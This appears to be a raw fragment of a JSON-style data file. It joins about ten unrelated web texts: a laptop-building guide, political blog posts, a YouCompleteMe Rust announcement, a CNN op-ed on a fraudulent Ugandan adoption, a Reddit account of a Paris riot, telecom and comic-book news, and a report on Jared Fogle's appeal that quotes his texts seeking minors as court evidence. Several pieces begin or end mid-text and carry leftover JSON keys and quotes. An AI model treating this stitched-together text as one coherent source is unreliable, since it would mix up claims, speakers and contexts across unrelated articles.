Samsung EVO (500GB to 1TB)\n\nRecommended M2 SSD: Amazon -> Samsung M2 EVO (500GB to 1TB)\n\nGraphics\n\nDepending on how you want to use the laptop you’re building, your graphics card can either do a lot or a little. This is one of the biggest areas you can increase your laptop’s performance if you’re doing demanding tasks. They can be broken into three main categories\n\nIntegrated Graphics\n\nThe latest Intel i-series CPUs actually have a graphics card built right in. This is known as onboard graphics, and it’s actually quite impressive! For day to day use, and even a little light gaming, integrated graphics is enough for most people.\n\nGaming Graphics\n\nFor Laptop Gamers, the only option is an Nvidia GTX series mobile graphics card. There are two generations on the market right now: Pascal, and Maxwell. Pascal is the latest, including the top of the line GTX 1080.\n\nThese cards come at a price, so many gamers choose to sacrifice 10 to 20% of the performance and save 40 to 50% of the price with a Maxwell-based GTX 980.\n\nProfessional\n\nThe Nvidia Quattro graphics cards are based on a similar architecture as their gaming cards, but they’ve been tweaked for professional use. These cards are used for video editing, 3D rendering, and mathematical simulations.\n\nEven though it’s the most expensive on the list, there is no reason to buy it unless you really need it.\n\nDisplay\n\nAlthough it’s not a component you commonly think about, your display has a huge effect on how much you enjoy your laptop. You spend most of your time looking at it, so picking the correct one is important. There are two main things you want to look for, size and resolution.\n\nDisplay Size\n\nLaptops are sold with displays ranging from 10” up to 17”. Once you pick your laptop, you won’t be able to change the screen size later. Often, if you’re not happy with the display size in a particular model, the only option is to choose a different one.\n\nRight now, the sweet spot for displays is 13” for portability, or 15” for performance. 17” displays are very nice to use, but should only be selected if you’re not going to be carting your laptop around with you all the time.\n\nLarge displays also use more power to light, so you can expect a drop in battery life. On the other side of the equation, 10” and 11” laptops are often sold as ultraportable or convertible tablets. Generally, these systems are so compact that you won’t have a lot of configuration options.\n\nResolution\n\nResolution refers to the number of pixels in your laptop’s display. When you see Apple advertising their laptops as ‘retina,’ this just means that the pixels are so dense you cannot tell them apart.\n\nThere are many laptops on the market that have 4K displays, which are equivalent to the retina models used in Apple’s computers. Most computers, however, ship with 1080p displays. Not only are they affordable, but most software is designed to run on a 1080p display.\n\nIf you’re gaming, the lower resolution means that you’ll see higher frame rates.\n\nFeatures\n\nMost self-built laptops have a number of other features that you can pick and choose from. Things like fingerprint readers, large touchpads, and memory card readers are often included. For the most part, these components are not user installed.\n\nYou need to ask the manufacturer for them if they are an option. The one thing you may need to install yourself is a network card. You’re going to want to get one that supports 802.11ac. This is the latest networking technology and gives you the fastest performance on any wireless hotspot.\n\nLaptop Build Recommendations\n\nIf you still haven’t found a laptop system you like, we’ve got some recommendations. All of these systems come pre-configured but if you’re only looking to building your own laptop, these systems are completely ready for you to customize.\n\nRemember, you have two options. Most consumers will want to choose all the components themselves and have assembly completed by the manufacturer. Alternately, you can do the assembly by ordering them without RAM, storage, or networking interfaces and installing these components separately.\n\nNot every manufacturer allows this, but it can be an option.\n\nAffordable Custom Laptops [Readers’ Favourite]\n\nGenerally, custom laptops are sold to people who want the highest performance possible. But that doesn’t mean you’ll have to pay top dollar. Our recommendation is the ENZ K36 Gaming Laptop.\n\nWhat This Laptop Comes With\n\nThis system comes with a 15.6-inch FHD IPS display, an Intel Core i7-6700HQ processor, and Intel HD Graphics 530 + NVIDIA GeForce GTX-960M. It’s a great gaming laptop, and it’s very well equipped to handle anything else you throw at it.\n\nYou Might Also Like:\n\nAmazon -> Sager NP8954\n\nThis Intel i7-8750H based computer gives you a bigger display. You can choose a better graphics card and up to 16GB of memory.\n\nAmazon -> MSI PE60\n\nMSI designed this laptop for people who might want to do a little light gaming. It’s got an Intel Core i7 processor and can be used with a high-speed M2 SSD.\n\nMost Powerful Custom Laptops\n\nIf you want a top of the line laptop computer, then you’ve come to the right place. Most custom build laptops cater to the high-end crowd. Our recommendation is the (Amazon ->)Sager NP8955.\n\nWhat This Laptop Comes With\n\nThis laptop build has a massive 15.6″ FSD IPS 144 Hz 5ms display. It takes the latest i7 processors and is recommended for the quad-core model.\n\nWhat You Choose\n\nIt has interchangeable graphics cards and can be configured for SLI (dual cards) if you like. With four ram slots, you can install up to 64GB of 2666 MHz memory. There are two 2.5” slots, and one M2 slot, so you can have up to three storage devices.\n\nYou Might Also Like:\n\nAsus G70\n\nThis laptop has a thinner profile but can support the latest Nvidia GTX 1080 graphics card. It has two M2 SSD slots, so you can have more SSD storage than any other laptops on the market.\n\nAmazon -> MSI WT72\n\nThis laptop is designed for professionals. It comes pre-installed with a Quadro M5500 graphics card and can support up to 64GB of ram, Dual M2 SSD, and a 1TB HDD.\n\nIf you’re looking to build a laptop that meets your exact specifications, there are hundreds of options to choose from. To narrow it down, all you need to do is find out which components best suit your needs, and find a model that meets those requirements.\n\nWe’ve made some recommendations throughout this guide, and hopefully, that will narrow down your choices.\n\nUntil next time!",
  "latent_22059": "Looking for news you can trust?\n\nSubscribe to our free newsletters.\n\nGlenn Greenwald is appalled that Chicago mayor Rahm Emanuel and Boston mayor Thomas Menino are trying to block Chick-fil-A from opening stores in their cities because the company’s CEO opposes gay marriage:\n\nIf you support what Emanuel is doing here, then you should be equally supportive of a Mayor in Texas or a Governor in Idaho who blocks businesses from opening if they are run by those who support same-sex marriage — or who oppose American wars, or who support reproductive rights, or who favor single-payer health care, or which donates to LGBT groups and Planned Parenthood, on the ground that such views are offensive to Christian or conservative residents. You can’t cheer when political officials punish the expression of views you dislike and then expect to be taken seriously when you wrap yourself in the banner of free speech in order to protest state punishment of views you like and share. Free speech rights means that government officials are barred from creating lists of approved and disapproved political ideas and then using the power of the state to enforce those preferences.\n\nI’ll confess that I can imagine exceptions to this rule. If the Westboro Baptist Church or the KKK wanted to open a hamburger joint in Irvine, my dedication to the First Amendment would be pretty sorely tested. I suppose I’d let them in, but I won’t pretend that I might not scrutinize their applications a little more closely than usual, hoping to find a reason to turn them down.\n\nThat aside, there’s really no excuse for Emanuel’s and Menino’s actions. If you don’t want to eat at Chick-fil-A, don’t eat there. If you want to picket them, go ahead. If they violate the law, go after them. But you don’t hand out business licenses based on whether you agree with the political views of the executives. Not in America, anyway.\n\nOn a related note, what makes this whole situation so weird is that Chick-fil-A President Dan Cathy has always opposed gay marriage. He’s a devout Southern Baptist, just like his father, who founded the company. The place is closed on Sundays, for crying out loud. There’s just nothing new here.",
  "latent_22156": "YouCompleteMe, Rust\n\nYouCompleteMe now supports Rust auto-completion and GoTo. Rust semantic analysis is provided by racerd, a JSON/HTTP server powered by racer. YCM with Rust provides a superior experience to current vim-racer, emacs-racer, and other racer-based plugins.\n\nYouCompleteMe\n\nFor the uninitiated, YouCompleteMe is a fast, fuzzy, as-you-type code-completion engine built originally for Vim. YCM runs on Mac, Linux, and Windows and includes completion engines for C/C++, ObjC, Python, C#, Go, TypeScript, JavaScript, and now Rust. YCM additionally provides an identifier based completion engine to supplement semantic completers and provide completions for languages without native support.\n\nThe YCM core, ycmd, exists as an independent project; clients for Vim, Emacs, and Atom all share the same infrastructure. The complete list of known clients is found in the ycmd README. If a ycmd client does not exist for $EDITOR , integrating with ycmd is as simple as integrating with a REST API. The ycmd example client shows how it’s done.\n\nRust\n\nRust is a systems programming language that runs blazingly fast, prevents segfaults, and guarantees thread safety.\n\nSupport for Rust is now available in YCM. The result is a powerful development environment providing completions and GoTo in your favorite editor. Examples below assume your editor is Vim. For other editors, please reference their YCM client.\n\nCompletions\n\nSemantic completions in YCM are provided when a semantic trigger, . , or :: , is detected. In the provided example, you can see a completion menu immediately appear after typing std:: , std::collections:: , and Vec:: ; no hotkey was necessary. As you continue to type, YCM fuzzy-filters available completions using your input to narrow the completion list.\n\nGoTo\n\nThe YCM Rust Completer provides the GoTo subcommand. GoTo attempts to find where the identifier under the cursor is defined. If successful, a buffer is opened for the file containing the definition, and the cursor is placed on the definition.\n\nThe complete GoTo command in Vim is :YcmCompleter GoTo , and I highly recommend mapping it to some hotkey. Example:\n\nnnoremap < Leader >] : YcmCompleter GoTo < CR >\n\nYCM Configuration (Vim)\n\nRust completions and GoTo from the current crate and its dependencies will be available without any additional configuration. For completions in the standard library, a single variable g:ycm_rust_src_path must be defined in your .vimrc.\n\n\" Naturally, this needs to be set to wherever your rust \" source tree resides. let g:ycm_rust_src_path = '/usr/local/rust/rustc-1.5.0/src'\n\nDifferences from vim-racer, emacs-racer, and others\n\nSince racerd , and subsequently YCM’s Rust Completer are powered by racer , the same code-completion and find-definition features are available. The addition of YCM to this equation provides a massive quality-of-life improvement over the existing plugins:\n\nNo hotkey required for completions\n\nFuzzy search of available completions\n\nIdentifier-based completion engine to supplement rust completions\n\nPerformance: Completions are cached within YCM, and latency with racerd is typically only a few ms once files are cached from disk. This is discussed more in the racerd section following.\n\nracerd\n\nracerd is suitable for providing completions and find-definition support for any Rust IDE and is not constrained to YCM. It provides several benefits over integrating racer via the command line or with the racer daemon flag.\n\nPersistent file caching: When starting a new racer process for every completion, or when running racer in daemon mode, the cache is thrown out after each operation. Racerd keeps this cache between requests. This gives a nice performance boost since files only need to be read from disk once. Support for dirty buffers: Racerd’s JSON API supports a buffers field - a list of file paths (which need not exist) and associated contents which is added to the racer cache before performing a query. This feature eliminates the need for temporary files. HTTP/JSON API: Very effective method for integrating a semantic completion engine. Just about every language has a built-in or library for querying such an API, and it is extremely performant on localhost (a few ms for completing out of standard library). The process is long lived; there is no process startup overhead for each query. Racerd also has extensive API documentation.\n\nGiving Thanks\n\nYouCompleteMe would not be the fantastic project it is, both technically and as a positive open-source community, without the work of @Valloric and the YCM team @micbou, @oblitum, @vheon, and @puremourning. racerd and YCM’s Rust completer would not have been possible without @phildawes’ fantastic racer library. Thanks to @birkenfeld for his assistance implementing some changes in racer to make racerd possible. Thanks to @reem whom I pestered with far too many questions in #iron. Finally, thanks to the YCM team for reading drafts of this post.",
  "latent_22236": "Massive national debt, drone warfare, an immoral tax code, a weak economy, and a thousand other things going wrong in America – and this is what some Members of Congress are worried about:\n\nA group of House Democrats on Wednesday introduced a bill that would prevent the term “Redskins” from being trademarked, a move intended to put pressure on the Washington football club to change its name.\n\nThe Non-Disparagement of American Indians in Trademark Registrations Act of 2013 is co-sponsored by Del. Eleanor Holmes Norton (D-D.C.), and comes days after a federal trademark panel heard arguments over whether the team name was a slur. The panel could potentially overturn the team’s trademark, which would erode profits by allowing other businesses to sell apparel and goods featuring the Redskins name.\n\nNow, this silliness is not limited to Democrats, but it does highlight the problem of prioritization in Congress. A similar example on the other side of the aisle is a bill backed by many Republicans – including my old boss on Capitol Hill, Rep. Kenny Marchant (R-TX) – the No Social Security for Illegal Immigrants Act of 2011. Yet this bill, despite its important-sounding name, would merely repeat existing law.\n\nThere were over 10,000 bills introduced in Congress in 2011 and 2012, during the 112th Congress, yet only 219 became law. Many of these were high-profile bills that aimed to do a whole host of activities, but had absolutely zero chance of passage through a split-party Washington.\n\nWhat are the practical implications of the Redskins bill and others like it? I see three:\n\nFirst, Members are proposing bills more for their own re-election/constituent public relations purposes than any actual intent to make bills law.\n\nSecond, because they have little chance of becoming law, many of these bills are mere distractions. Take the Redskins bill that was the launching pad for this post – it could be argued that by merely bringing attention to the bill, I am distracting from other, more important issues and bills. And, to be honest, it’s a legitimate argument.\n\nThird, it shows just how silly Congress is. Playing political games both internally and with the media and constituents is more important than doing the job Congress is voted and paid to accomplish – keeping the federal government within the limits of the Constitution in order to make our union more perfect.",
  "latent_22293": "Jessica Davis is a photographer who lives in Ohio with her husband (and best friend) of 16 years and her four children. The opinions expressed in this commentary are hers.\n\n(CNN) I've always hoped to make a difference in this world. To bring goodness, peace or healing to a world that often seems inundated with loss, hardship and a vast array of obstacles that make life difficult for so many. When it came to the decision to adopt, it seemed like a no-brainer.\n\nI thought this was one way to make a difference, at least for one child. My husband, Adam, and I would open our home and our hearts to a child in need.\n\nWhat I didn't realize when I began this journey was that adoption was so much more than just these things. I didn't expect it to be all sunshine and rainbows, but neither did I realize the depth of heartache and loss adoption can entail, not only for adoptive parents, but even more so for the adopted children, like the one we were about to meet and welcome into our lives.\n\nAdam and I thoroughly researched at each step of the process in the hopes of ensuring a proper and ethical adoption. You see, we were already parents to four biological children, so this was not about \"having another child\" or simply \"growing our family.\" For us, adopting was about sharing our abundance -- our family, love and home with a child who lacked these basic necessities.\n\nNot one part of this process was easy -- even the decision to adopt internationally. We knew that there were American children, as well as children all over the world, in need of what we could offer. We eventually concluded (based on what we now see as a form of propaganda) that the greatest need was in many of the poorest countries.\n\nJUST WATCHED Part 2 of CNN's exclusive investigation: Kids for Sale Replay More Videos ... MUST WATCH Part 2 of CNN's exclusive investigation: Kids for Sale 09:15\n\nI remember reading that there are almost 3 million orphans in Uganda, and with that statistic in mind (and a bit more research), in October of 2013 we began the journey to adopt from there. We did piles of paperwork, got countless sets of fingerprints and spent tens of thousands of dollars. It took a little over a year to get through all the formalities, but I was driven to get to the best part of this process, meeting the needs of a child.\n\nEventually we got to that point. In 2015, we welcomed a beautiful, strong and brave 6-year-old girl named Namata into our home. There is no one blueprint when it comes to adoption, but I attempted to do my homework as thoroughly as any adoptive parent could -- still, nothing could've prepared me for what happened next.\n\nIt took a little over a year and a half to realize the things \"our\" child was telling us were not adding up to the stories told within the paperwork and provided to us by our adoption agency, European Adoption Consultants, Inc.\n\n(In December, the US State Department debarred the agency for three years, meaning it could no longer place children in homes. The State Department said it found \"evidence of a pattern of serious, willful or grossly negligent failure to comply with the standards and of aggravating circumstances indicating that continued accreditation of EAC would not be in the best interests of the children and families concerned.\")\n\nJUST WATCHED Mata plays with her adopted sister Replay More Videos ... MUST WATCH Mata plays with her adopted sister 00:10\n\nAt first I wondered if the conflicting information Namata was sharing with us reflected her efforts to cope with the trauma of being relinquished and abused. But I came to realize that she was telling me something vastly different -- and vastly more important.\n\nAt many points during that year and half, I had to suppress the compulsion to view the things she was telling me through my own lens, as all too often that lens is clouded by one's own privilege and experiences. It was when I began to listen with this openness that I realized what she was so desperately trying to get me to understand.\n\nThe child we had struggled for years to adopt was not an orphan at all, and almost everything that was written in her paperwork and told to us about her background was not an accurate description of her life in Uganda.\n\nPhotos: Mata's life in the United States Mata, as she is known, became part of Jessica and Adam Davis' family, along with their daughters Abby, left, and Taylor and sons Owen, center, and Isaac.\n\nHide Caption 1 of 7 Photos: Mata's life in the United States Abby Davis gives Mata a kiss the day she officially became part of the family.\n\nHide Caption 2 of 7 Photos: Mata's life in the United States Jessica Davis says her children and Mata became fast friends, bonding over bubbles and games of tag.\n\nHide Caption 3 of 7 Photos: Mata's life in the United States Mata saw snow in the US, a rarity in Uganda.

Hide Caption 7 of 7\n\nMore than that, we eventually uncovered that she had a very loving family from which she had been unlawfully taken, in order (we believe and are convinced) to provide an \"orphan\" to fulfill our application to adopt.\n\nDevastated doesn't even begin to explain what we felt once we realized what had transpired to bring Namata into our family. Namata's mother was told only that Adam and I were going to care for her child while we provided her with an education, which is a central pathway to empowerment and opportunity in Uganda.\n\nSo when this supposed chance to be sponsored by a \"wealthy\" American couple was presented to her, she felt as if she and her daughter had been blessed. She never knowingly relinquished her rights as Namata's mother, but once there was a verbal confirmation that we would adopt Namata, those on the ground in Uganda forged paperwork and placed Mata in an orphanage.\n\nBy the time Mata's mother realized what was happening, that she was never going to see her child again, she was powerless to stop the wheels that were turning. After many months of uncovering the details in our case, I have also come to realize Mata's mother's experience is not uncommon within international adoption.\n\nThere are villages in Uganda and across the world where mothers, fathers, siblings and grandparents are desperate to be reunited with the children who were unlawfully separated from them through international adoption. It has been heartbreaking for me to realize that so beautiful and pure an act can be tainted with such evil. But as with so many beautiful things in this world, corruption and greed are a reality -- one we can't simply ignore.\n\nJUST WATCHED Mata leaves for Uganda Replay More Videos ... MUST WATCH Mata leaves for Uganda 00:56\n\nInternational adoption must be reformed. Adopting parents and the governments involved in this process cannot plead ignorance anymore.\n\nThroughout the journey to reunite Namata with her family, I have been met with so much resistance, saturated in entitlement and privilege. More than once I have been asked, why don't you just \"keep her\"? These are words I use when describing something I purchased at the grocery store! I never owned Namata; she is a human being who deserves better than that type of narrow-minded and selfish thinking.\n\nOnce, someone suggested that I just not tell anyone what she had told us. Other times, I was told that it was my Christian duty to keep her and \"raise her in the proper faith.\"\n\nEven in the end, with all the information establishing that Namata's mother had never relinquished her child, I was told by US government officials that I got to decide whether or not to reunite her. Her mother, whose rights were unlawfully stripped from her, appeared not to be a factor in the least.\n\nThe travesty in this injustice is beyond words. I must be clear in the following statement: My race, country of origin, wealth (though small, it's greater than that of the vast majority of people in the world), my access to \"things,\" my religion -- none of these privileges entitles me to the children of the poor, voiceless and underprivileged.\n\nIf anything, I believe these privileges should come with a responsibility to do more, to stand up against such injustices. We can't let other families be ripped apart to grow our own families!\n\nI'm sure that most families seeking international adoption have the best of intentions, but good intentions are not an excuse for ignorance. After unveiling Namata's true story and doing extensive research, I feel I have gained an awareness of the realities of corruption occurring across the board within international adoption. This complicated yet beautiful act of opening up a home and a heart to a child in need has become heavily corrupted by greed and saviorism.\n\nMy family's journey to adopt has become a journey to fight for families. Families that are being torn apart because of ignorance and a lack of empathy for those who have no voice to speak out against the injustices they face every day. I cannot look the other way. I must continue this fight until I see a change in the system.\n\nJUST WATCHED Mata and her mom reunite Replay More Videos ... MUST WATCH Mata and her mom reunite 00:22\n\nI can also say that I have seen the beauty of a family restored and there is nothing quite like it. Adam and Namata took the long journey to her remote village in Uganda together, while I remained at our home with the biological children. We could not afford for both of us to go, and my husband was concerned for my safety after the corruption I had exposed. He was also just as concerned for Namata's safety and wanted to be at her side until the moment she was home in the protection of her mother's arms. So I reluctantly said my goodbyes to her here in America.\n\nThough we were overwhelmed with heartache that morning, Adam, the kids and I all tried to smile through it, because for Namata it was a happy day. She could not wait to be reunited with her family and we were very careful not to steal her joy. I witnessed this part of the journey through video calls and pictures and it was beautiful. Painfully beautiful.\n\nIn September of 2016, Namata's mother embraced her child with joy and laughter abounding and they have not spent a day apart since. Namata has flourished since being home and I am thankful for that.\n\nDuring this journey, I have also come to a revelation of what it means to truly aid and love the orphan (a phrase often used when discussing adoption). That love goes far beyond anything I could've fathomed before. Now it seems so clear. Now those hundreds of adult adoptee's voices I have encountered since I began this journey ring clearly in my ears.\n\nThe vast majority of children in orphanages, and countless children adopted internationally, are not orphans at all (according to Catholic Relief Services ). Most have a parent, or parents. Additionally, many have siblings, grandparents, aunts and uncles, who care about them.\n\nMy good intentions all along were misguided. If I truly wanted to help or aid an orphan, that act required that I make certain that every effort has been made to keep that child within her biological family! Had that been my focus from the start, I may not have missed so many red flags.\n\nToo many of us see international adoption as way to \"save\" children. But what if we looked at it another way? What if we decided to do everything in our power to make sure those children could live their lives with the families God intended for them in the first place?\n\nI'm not talking about children taken by necessity from abusive or neglectful homes, but those whose loving families were wrongly persuaded to give them up. Families who thought the decision was out of their control because of illness, poverty, lack of access to education, intimidation, coercion or a false idea about what the \"American dream\" means for their child.\n\nSo am I saying don't adopt? No!\n\nPhotos: Mata is reunited with her family Mata was reunited with her mother in their Ugandan village. \"I had not realized that I had gone through a process to take away my parental rights completely,\" her mother told a Ugandan court.

Hide Caption 8 of 8\n\nI've heard plenty of adult adoptees say they are completely against adoption, and I will not demean their voices or take away their right to feel this way because it's a lifetime of experience that informs their opinions.\n\nBut because of their strong voices, I have also seen a new wave of opened eyes among parents who adopt children -- parents who understand the losses their adopted children have suffered, who listen to them, who rise to the huge obligations and high standards that adoption requires.\n\nOnly through listening and acknowledging hard truths can adoption lead to an ethical and positive outcome. This will mean something different with each family. For us, it meant reuniting a family torn apart by a corrupt process and exposing criminal activities within international adoption. For others, it may mean a lifetime of making sure a child holds on to his or her cultural or racial identity, or keeping alive his or her ties to their birth family, no matter how hard that may be. Adoption can be beautiful, but it is never easy.\n\nSo I say yes to adoption, as long as families have a clear understanding of the weight they will bear. The weight of doing right by this child in ways you maybe never realized before: fighting for his or her best interests, without ill intentions, selfishness or greed. And realizing that sometimes that best interest might mean he or she does not become your adopted child at all.\n\nI get updates on our once-adopted child, Namata, often with pictures and sometimes video. When I first see them, I tend to get teary-eyed because of how much I miss her. I would love to wrap my arms around her, but then I remind myself of all that she almost lost by being adopted.\n\nSometimes there are pictures of her at her grandmother's home, skipping about, smiling from ear to ear. Other times she's holding her baby sister, or walking home from school with her other sister.\n\nOne of my favorite pictures thus far is this one of Namata sitting on the ground, facing her mother. And her mother -- the woman who gave birth to her, looks like her, smiles like her and loves her more deeply than anyone else on the face of the earth -- is looking back at the daughter she nearly lost.",

Take the ‘free speech’ issue. Yesterday some anarchists were aligned with the UAF in calling for the banning of Geert Wilders visit.Since when did anarchists call for government bans and prosecriptions? I would no more call for a ban on Wilders visit than I would for Louis Farrakhan or ask the government to ‘ban the burkha’ or ban cartoons offensive to Islam or for that matter ‘ban fox hunting’ or smoking in bus shelters or ban marches of people I disagree with.Yes..free speech is indivisible and is not qualified by a ‘but…’ . And free speech certainly includes blaspheming others holy texts. Tough shit cry babies – live with it. We have left campaigning against political correctness to right wing idiots like Jeremy Clarkson, Richard Littlejohn, bumbling Boris and the Daily Mail and become associated with a killjoy leftist miserabilism. We have abandoned much of our natural political constituency to the right and in doing so have allowed the EDL to pose as the champions of traditional English liberties.\n\nLeave alone libertarian impulses what happened to our hedonistic impulses – where are they in contempoary anarchist propaganda? Actually comrades we are against the state – so we should make no demands of it to discomfort our opponents. Now I’m with the Hunt Sabs every time or anyone who chucks an egg at Farrakhan……but do it yourself comrades – don’t ask for your enemy to do it for you. And while we’re at it comrades …’Who put the ram in the ramma lama dingdong’?",
  "latent_22654": "Obligatory: This didn't happen today, but over the summer. also warning some NSFW language.\n\nTL;DR first because it's long: Went to Eiffel Tower to watch Euro 2016 finals, ended up in a riot because we ran late, got tear gassed, girlfriend dislocated knee, her phone stolen, my nose broken, and our passports stolen.\n\nBACKGROUND: My girlfriend (who we'll call Emily) and I were in Paris on the very first day of a month long backpacking trip in Europe. We spent the whole morning smoking hash at Sacré-Coeur with some new friends, who told us that the Euro 2016 final between France and Portugal was that night. They told us to meet them to watch the game at the 'fan zone' at the Eiffel Tower but urged us not to be late, otherwise we wouldn't get into the 'fan zone.'\n\nBeing jet-lagged and burnt out from the hash, we took a nap before heading down, but overslept by an hour. We figured we'd head down to the Eiffel Tower anyway and see what was going on. whoops.\n\nTHE FUCK UP: Arriving at the Eiffel Tower we realize there isn't any fanzone to be found, or so we think. It turns out we are in the Arriving at the Eiffel Tower we realize there isn't any fanzone to be found, or so we think. It turns out we are in the completely wrong place on the opposite side of the tower from the fan zone, and amongst a crowd of mostly troublemakers that is about to erupt into a riot.\n\nThe first signs of chaos are a small group of youths antagonizing police underneath the tower, and when we see a massive line of riot police facing in our general direction, we decide it's time to leave. As we make our way through the crowd I hear screaming and look up in horror to see a smoking projectile sailing through the sky, headed right for us. The crowd around us scatters, knocking Emily and I down, where a tear gas canister blows up mere feet from our faces.\n\n\"Get up! We have to go!\" I'm screaming at Emily but I notice she's crying & screaming out in pain, not from the tear gas in our eyes but from the fact that her knee is so broken the thing might as well be on Mars. I throw her over my shoulder and go sprinting through clouds of tear gas out of the chaos and onto the Pont d'Iena bridge, where some guy snatches Emily's phone out of her hand. I turn and watch helplessly as the guy runs off into the crowd, Emily screaming \"he took my phone!\"\n\n\"Fuck the phone!\" I run as far as my arms/legs allow and then set her down. I need to get her to an ambulance, but I can't leave her to find one, so I need someone to help me. So I start screaming at the crowd around me for someone to help, forgetting that I am amongst almost nothing but riff-raff of the worst variety. Nobody helps me or seems to give a shit, so I pick her up and run as far as I can and set her down again. A crowd gathers ogling my girlfriend's knee and staring at me blankly as I shout shit they don't understand like \"911! AMBULANCE!\"\n\nIt's then I am disgusted to notice a hand reaching from Emily's purse to my back pocket, and I slap it away forcefully, standing up from a crouching position as I do so, screaming \"FUCK OUT OF HERE!\" I look into the eyes of the perpetrator, a young African guy who loads up and punches me in the face, shattering my nose. As blood spurts out of my nose I look at the guy and say with genuine bewilderment \"are you fucking kidding me?\" He looks at me blankly like he is genuinely surprised to see me still on my feet and spitting profanity at him. I scoop up my girlfriend and start running for our lives.\n\nI'm now running on what I am convinced is just an infinite bridge of hell on earth. Brawls rage around us as my knees are starting to buckle, my vision blurring. I'm bleeding out of my head onto my girlfriend's lap who is screaming in agony from being carried around with a dislocated knee. I am pretty sure we are going to die.\n\nSuddenly I'm joined by our savior, a very large goofy looking fellow, who begins helping me carry Emily and encouraging us in French or some other language which we didn't speak. It occurs to me that he could be trying to steal from us too, but at this point I don't even care. Our new friend's intentions turn out to be true, as he and his group of friends helped me carry my girlfriend to relative safety and helped me guard her while they got help. (For a while I couldn't tell this part of the story without getting extremely emotional about this guy and his friends who stepped up to help us when everyone else was trying to take advantage of our situation. I'll never forget him.)\n\nA bunch of paramedics pulled up in a station wagon, urging me to stay calm while they waited for an ambulance. As police pushed rioters further down the bridge in our direction, I begged the paramedics to just get us out of there in the car. With fear in their eyes and the situation escalating they finally relented, carefully placing Emily in the backseat while I jumped in the trunk.\n\nThey got us to a safe part of the city and asked us for our ID. It's then we realized that, as if we weren't having a bad day already, our passports had been stolen.\n\nWe ended up at a hospital outside Paris, where they did a great job re-setting my girlfriend's knee and didn't touch my nose which was fine with me. It's still crooked. Luckily we were able to get emergency passports and continue on the rest of our trip which was absolutely amazing. I still smell tear gas sometimes when I see Eiffel Tower pictures & trinkets. Good times!\n\ntl;dr (again): Was late to the Eiffel tower to watch Euro 2016 finals, ended up in a riot, got tear gassed, girlfriend's knee broken, her phone stolen, my nose broken, and our passports stolen.\n\nEDIT: Since people are pointing out how I mentioned that the guy who punched me was African, which was for the sole purpose of illustrating the scene, I'd like to add that my entire day in Paris was spent hanging out with African guys who showed me more hospitality than I have found almost anywhere else in the world. I hung out with these guys that one day for like 6 hours, they talked to me a lot about just how poor and starving much of the African population in Paris is. I harbored a lot of anger towards the guy that punched me for a while but I also understand the context of just how starving that guy probably was. people that are trying to politicize this, or turn it into some racist/anti-refugee talking point, or are leaving comments like \"those thugs should burn in hell\" should have a more nuanced perception of the world.\n\nEDIT2: if the Alt-right folks that are trying to make me their racist champion just because I called the guy African would fuck off, that would be great :)",

This essentially means that you can get unlimited internet for one year at just Rs. 249 per month. Previously, the plan was valid for six months, after six billing cycles, BSNL used to shift the users to BBG ULD 499 plan.\n\nThe conversion from BB249 to BBG UL 449 still exists, but it will only be done after one-year. This change in scheme will be valid for all the existing and new customers who already have or intend to join the plan. The report also says that the change will be effective from May 8, 2017, on a pan-India basis, but it won’t be applicable for the residents of Jammu & Kashmir and Andaman & Nicobar islands.\n\nBSNL recently revised download speed for almost all its broadband plans to 4 Mbps from 2 Mbps, but the company excluded the BB249 plan from that list, which could be the reason for this change.\n\nThe state-run telecom operator, nearly a month ago extended the BB249 broadband plan till June 30, 2017, which was about to expire on March 31, 2017. For the uninitiated, BSNL’s promotional plans will usually be valid for three months. Later on, the company could change it accordingly to the market scenario or just withdraw the offer.\n\nWith the overwhelming response received by the BB249 plan, BSNL decided to extend it to another three months, and this change will undoubtedly result in getting more subscribers under its belt. Do note that if a customer has already migrated to BB4 ULD 499 plan from the BB2249 scheme, this change won’t apply to them.",

So, being wise, they coincided Task Force X’s relaunched book with said film, with a lineup reflecting what was offered on the big screen. Basically, if you wanted more of Harley Quinn, Deadshot, Killer Croc and the rest of the crew, all you had to do was pick up a comic written by Rob Williams.\n\nIn the time since, the series has not only forged its own path, but has also become one of the better team-up books DC has to offer. Yes, a lot has gone down, but right now is the time to jump on the bandwagon if you haven’t already done so because issue #21 just so happens to begin a brand new story arc.\n\nTruth be told, we do recommend reading Suicide Squad #20, which hit stands last week, because that saw Harley Quinn unilaterally elected by Amanda Waller to become the new team leader, with Rick Flag no longer being among the living. Sure, we, like you, think the Joker’s ex-girlfriend may be too unstable for such responsibility, but “The Wall” certainly had a point when saying Harley can rally the troops like no other. So, we’re just going to have to see where this goes.\n\nWhat makes all this doubly interesting is that Harley and Rick became lovers right before his demise, so to say that she’s not coping well is an understatement. Needless to say, we in no way envy the mysterious group known as “The People,” who have been causing headaches for the Squad of late. Elsewhere, Waller has matters both professional and private dividing her time, so be sure to follow those threads as well.\n\nSuicide Squad #21 arrives in comic shops on Wednesday, July 12.",

(Photo: Charlie Nye/IndyStar file)Buy Photo\n\nThe government responded to Jared Fogle's appeal of his prison sentence of almost 16 years by stressing text messages that the former Subway pitchman sent seeking sex with minors.\n\nThe texts, meant to illustrate the extremes to which Fogle went while committing his crimes, were included in a filing to the U.S. Court of Appeals for the Seventh Circuit. They were part of Fogle's sentencing hearing last November but had not been previously reported in detail.\n\n\"I'll pay you big for a 14- or 15-year-old,\" said one text to an adult escort.\n\nAnother text said, \"Did you find me some young girls or boys?\" Fogle wanted the child to be able to prove his or her age, adding, \"If they can and you get me 16 or below, I'll give you 400 at least.\"\n\nFogle is in prison after pleading guilty to charges involving child pornography and sex with underage prostitutes. He is appealing the sentence — which exceeded federal guidelines — given by federal judge Tanya Walton Pratt.

The question is then: Why sentence him to more than five years beyond that?\"\n\nHis lawyers argued that prosecutors \"knew everything the (judge) knew and still agreed to a below Guidelines sentence that adequately reflected the severity of the crimes to which Fogle pleaded ….\"\n\nGovernment lawyers argued that the sentence was \"procedurally proper\" and that the judge \"thoroughly and appropriately explored the unusual nature and circumstances of Fogle's offenses and his history and characteristics.\"\n\nThe government's filing said \"repeated text messages and emails showed Fogle had a pattern: he found adult escorts through the Internet, developed relationships with them, and offered them finder's fees to provide him with access to minors for commercial sex.\"\n\nIt said he did this in \"several\" places, including Richmond, Va., Kansas City and Las Vegas.\n\nNEWSLETTERS Get the Breaking News newsletter delivered to your inbox We're sorry, but something went wrong Urgent developments you should know now, not later.

